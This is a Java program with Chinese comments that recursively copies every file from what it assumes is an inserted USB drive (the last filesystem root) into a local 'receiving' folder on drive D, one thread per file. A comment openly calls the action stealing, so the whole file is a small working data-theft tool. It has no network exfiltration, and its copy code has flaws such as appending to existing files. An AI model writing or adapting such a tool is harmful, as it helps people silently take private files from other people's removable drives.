import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

// 文件拷贝类
class CopyFileUtil {
    private CopyFileUtil() {

    }

    // 1. 判断拷贝的文件是否存在
    public static boolean fileExists(String path) {
        return new File(path).exists();
    }

    //  2. 判断目标文件父路径是否存在,如果不存在,创建
    public static void createParentDirector(String path) {
        File file = new File(path);
        if(!file.getParentFile().exists()) {
            file.getParentFile().mkdirs();
        }
    }

    // 3. 进行拷贝处理
    public static boolean copyFile(String srcPath, String destPath) {
        File inFile = new File(srcPath);
        File outFile = new File(destPath);
        FileInputStream input = null;
        FileOutputStream output = null;
        try {
            input = new FileInputStream(inFile);
            output = new FileOutputStream(outFile, true);
            copyFileHandler(input, output);
        } catch (Exception e) {
            System.out.println("拷贝异常");
            return false;
        } finally {
             try {
                input.close();
                output.close();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        return true;
    }

    private static void copyFileHandler(InputStream input, OutputStream output) throws Exception{
        long startTime = System.currentTimeMillis();

        // 缓冲区
        byte[] data = new byte[1024];
        int len = 0;

        while((len=input.read(data)) != -1) {
            output.write(data, 0, len);
        }

        long endTime = System.currentTimeMillis();
        // 花费时间(ms)
        System.out.println("用时(ms): "+(endTime-startTime));
    }
}

public class DriverName {

    public static void main(String[] args) {
        // 得到系统根目录
        File[] files = File.listRoots();
        // 拿到U盘FILE对象
        File destfile = files[files.length-1];
        listAllFiles(destfile);
    }

    // 递归操作函数
    public static void listAllFiles(File file) {
        try {
            if(file.isFile()) {
                // 选择操作的动作，我这里是拷贝(窃取)
                System.out.println(file);
                copy(file.toString());
            } else {
                File[] files = file.listFiles();
                for(File tmp : files) {
                    listAllFiles(tmp);
                }
            }
        } catch (Exception e) {
            System.out.println("呕吼");
        }
    }

    // 文件拷贝方法
    public static void copy(String src) {
        Thread thread = new Thread(new Runnable() {

            @Override
            public void run() {
                // 拷贝目标路径
                String dest = "D:\\文件接收\\"+src.substring(3);
                if(CopyFileUtil.fileExists(src)) {
                    CopyFileUtil.createParentDirector(dest);
                    System.out.println(CopyFileUtil.copyFile(src, dest) ? "拷贝成功" : "拷贝失败");
                }
            }
        });
        thread.start();
    }

}